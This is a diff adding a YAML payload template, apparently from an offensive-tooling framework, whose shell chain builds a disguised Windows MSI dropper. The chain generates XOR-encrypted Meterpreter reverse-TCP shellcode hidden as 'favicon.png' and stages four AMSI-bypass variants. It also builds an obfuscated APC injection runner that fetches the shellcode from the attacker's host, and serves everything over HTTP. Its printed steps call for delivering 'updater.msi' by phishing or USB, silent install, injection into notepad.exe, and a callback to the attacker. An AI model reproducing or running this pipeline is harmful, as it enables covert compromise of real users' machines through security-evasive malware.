@@ -1,0 +1,54 @@
+---
+metadata:
+  filename: "deliver-windows-x64-metasploit-meterpreter-tcp-shellcode-runner-msi-x64-apc.yaml"
+  tags: ["shell", "windows", "evasion"]
+  created: "2026-06-02"
+  authors: ["@s3mme", "@TIVKU"]
+
+content: |
+  mkdir -p packstation/outbound; \
+  command -v wixl > /dev/null 2>&1 || printf '%s\n' 'ERROR: wixl (msitools) not found' ; \
+  command -v wixl > /dev/null 2>&1 && \
+  printf '%s\n' 'msfvenom creates the shellcode. Please wait...' && \
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} EXITFUNC=thread -f raw > packstation/outbound/shellcode.bin && \
+  python {{ templates_dir }}/helper_scripts/shellcode_encrypter.py -m xor -i packstation/outbound/shellcode.bin -o packstation/outbound/favicon.png && \
+  rm packstation/outbound/shellcode.bin && \
+  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset.yaml > packstation/outbound/offer1.txt && \
+  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset-2.yaml > packstation/outbound/offer2.txt && \
+  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-forceerror.yaml > packstation/outbound/offer3.txt && \
+  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-mattgref02.yaml > packstation/outbound/offer4.txt && \
+  python {{ templates_dir }}/helper_scripts/shellcode_runner_generator.py -t apc -d staged --url http://{{ attacker_ip }}:{{ delivery_outbound_port }}/favicon.png --xor CA --timing --obfuscate -o packstation/outbound/invoice.txt && \
+  python -c "import base64; open('/tmp/stager.wxs','w').write(base64.b64decode('{{ include('payloads/msi-powershell-stager.yaml') | base64 }}').decode())" && \
+  printf '%s\n' 'Compiling updater.msi. Please wait...' && \
+  wixl -a x64 -o packstation/outbound/updater.msi /tmp/stager.wxs && \
+  rm /tmp/stager.wxs && \
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' '                      ------Listener------                      ' && \
+  printf '%s\n' 'Start listener: {{ include('scripts/listener-metasploit-windows-x64-meterpreter-staged-tcp.yaml') }}' && \
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' '                  ---Step-by-Step Delivery---                  ' && \
+  printf '%s\n' 'Step 1 - Pick an AMSI bypass and copy it to offer.txt:' && \
+  printf '%s\n' '  offer1.txt (FieldOffset):   cp packstation/outbound/offer1.txt packstation/outbound/offer.txt' && \
+  printf '%s\n' '  offer2.txt (FieldOffset 2): cp packstation/outbound/offer2.txt packstation/outbound/offer.txt' && \
+  printf '%s\n' '  offer3.txt (ForceError):    cp packstation/outbound/offer3.txt packstation/outbound/offer.txt' && \
+  printf '%s\n' '  offer4.txt (MattGref02):    cp packstation/outbound/offer4.txt packstation/outbound/offer.txt' && \
+  printf '%s\n' 'Step 2 - Start the meterpreter listener (see above)' && \
+  printf '%s\n' 'Step 3 - Deliver updater.msi to the target (out-of-band: phishing, share, USB, etc.)' && \
+  printf '%s\n' 'Step 4 - Execute on target:' && \
+  printf '%s\n' '  msiexec /i updater.msi /qn' && \
+  printf '%s\n' 'Step 5 - Attack chain on install:' && \
+  printf '%s\n' '  MSI CustomAction (SYSTEM, deferred) -> powershell.exe -NoP -NonI -W Hidden -Enc <base64>' && \
+  printf '%s\n' '  -> IEX offer.txt (chosen AMSI bypass)' && \
+  printf '%s\n' '  -> IEX invoice.txt (APC shellcode runner)' && \
+  printf '%s\n' '  -> invoice.txt downloads XOR(0xCA) shellcode from http://{{ attacker_ip }}:{{ delivery_outbound_port }}/favicon.png' && \
+  printf '%s\n' '  -> injects into notepad.exe via Early Bird APC' && \
+  printf '%s\n' '  -> meterpreter callback on {{ attacker_ip }}:{{ shell_port }}' && \
+  printf '%s\n' '================================================================' && \
+  printf '%s\n' '                  ---Files in packstation---                   ' && \
+  printf '%s\n' '  updater.msi               -> compiled MSI dropper (deliver this to target)' && \
+  printf '%s\n' '  offer1-4.txt              -> AMSI bypass variants (pick one, cp to offer.txt)' && \
+  printf '%s\n' '  offer.txt                 -> chosen AMSI bypass (IEX by PowerShell)' && \
+  printf '%s\n' '  invoice.txt               -> APC shellcode runner (IEX by PowerShell)' && \
+  printf '%s\n' '  favicon.png               -> XOR(0xCA) meterpreter shellcode (fetched by runner)' && \
+  printf '%s\n' '================================================================' && \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
